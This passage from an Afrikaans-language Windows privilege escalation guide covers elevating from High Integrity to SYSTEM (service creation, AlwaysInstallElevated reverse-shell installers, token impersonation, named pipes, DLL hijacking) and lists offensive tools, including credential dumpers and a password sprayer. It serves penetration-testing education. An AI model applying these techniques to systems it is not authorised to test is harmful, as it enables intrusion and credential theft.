> `cng.sys` word normaalweg vanaf `C:\Windows\System32\drivers\cng.sys` gelaai, maar as ’n kopie in `C:\Windows\System32\cng.sys` bestaan, kan dit eerste probeer word, wat dit ’n betroubare DoS-teiken vir korrupte data maak.



## **Van High Integrity na System**

### **Nuwe diens**

As jy reeds op ’n High Integrity-proses loop, kan die **pad na SYSTEM** maklik wees deur eenvoudig ’n nuwe diens **te skep en uit te voer**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Wanneer jy 'n service binary skep, maak seker dat dit 'n geldige service is of dat die binary die nodige aksies vinnig uitvoer, aangesien dit binne 20s beëindig sal word indien dit nie 'n geldige service is nie.

### AlwaysInstallElevated

Vanuit 'n High Integrity-proses kan jy probeer om die **AlwaysInstallElevated registry entries te enable** en 'n reverse shell te **install** deur 'n _**.msi**_-wrapper te gebruik.\
[Meer inligting oor die registry keys wat betrokke is en hoe om 'n _.msi_-package te install, is hier beskikbaar.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Jy kan** [**die code hier vind**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

As jy daardie token privileges het (jy sal dit waarskynlik in 'n reeds High Integrity-proses vind), sal jy **byna enige process** (nie protected processes nie) met die SeDebug privilege kan **open**, die **token** van die process kan **copy**, en 'n **arbitrary process met daardie token** kan skep.\
Deur hierdie technique te gebruik, word gewoonlik **enige process wat as SYSTEM loop en al die token privileges het, gekies** (_ja, jy kan SYSTEM-processes sonder al die token privileges vind_).\
**Jy kan 'n** [**code example wat die voorgestelde technique uitvoer, hier vind**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Hierdie technique word deur meterpreter gebruik om in `getsystem` te escalate. Die technique bestaan uit **die skep van 'n pipe en daarna die skep/misbruik van 'n service om op daardie pipe te skryf**. Dan sal die **server** wat die pipe met die **`SeImpersonate`** privilege geskep het, die **token** van die pipe se client (die service) kan **impersonate** en sodoende SYSTEM privileges verkry.\
As jy [**meer oor named pipes wil leer, moet jy dit lees**](#named-pipe-client-impersonation).\
As jy 'n example wil lees van [**hoe om van high integrity na System te gaan deur named pipes te gebruik, moet jy dit lees**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

As jy daarin slaag om 'n dll wat deur 'n **process** wat as **SYSTEM** loop, **gelaai** word, te **hijack**, sal jy arbitrary code met daardie permissions kan uitvoer. Daarom is Dll Hijacking ook nuttig vir hierdie soort privilege escalation, en dit is boonop **baie makliker om vanuit 'n high integrity process te bereik**, aangesien dit **write permissions** op die folders sal hê wat gebruik word om dlls te laai.\
**Jy kan** [**hier meer oor Dll hijacking leer**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Lees:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Beste tool om Windows local privilege escalation vectors te soek:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Kontroleer vir misconfigurations en sensitive files (**[**kyk hier**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Kontroleer vir moontlike misconfigurations en versamel info (**[**kyk hier**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Kontroleer vir misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Dit onttrek gestoorde session information van PuTTY, WinSCP, SuperPuTTY, FileZilla en RDP. Gebruik -Thorough lokaal.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Onttrek credentials van Credential Manager. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray versamelde passwords oor die domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh is 'n PowerShell ADIDNS/LLMNR/mDNS-spoofer en man-in-the-middle-tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basiese privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Soek vir bekende privesc vulnerabilities (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Admin rights benodig)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Soek vir bekende privesc vulnerabilities (moet met VisualStudio compiled word) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumerate die host op soek na misconfigurations (meer 'n gather info-tool as privesc) (moet compiled word) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Onttrek credentials uit baie softwares (precompiled exe in github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port van PowerUp na C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Kontroleer vir misconfiguration (executable precompiled in github). Nie recommended nie. Dit werk nie goed in Win10 nie.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Kontroleer vir moontlike misconfigurations (exe vanuit python). Nie recommended nie. Dit werk nie goed in Win10 nie.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool geskep gebaseer op hierdie post (dit benodig nie accesschk om behoorlik te werk nie, maar dit kan dit gebruik).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Lees die output van **systeminfo** en beveel werkende exploits aan (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Lees die output van **systeminfo** en beveel werkende exploits aan (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Jy moet die project compile deur die korrekte weergawe van .NET te gebruik ([**sien dit hier**](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Om die geïnstalleerde weergawe van .NET op die victim host te sien, kan jy die volgende uitvoer:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Verwysings

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [Trail of Bits - C/C++ checklist challenges, solved](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)

{{#include ../../banners/hacktricks-training.md}}
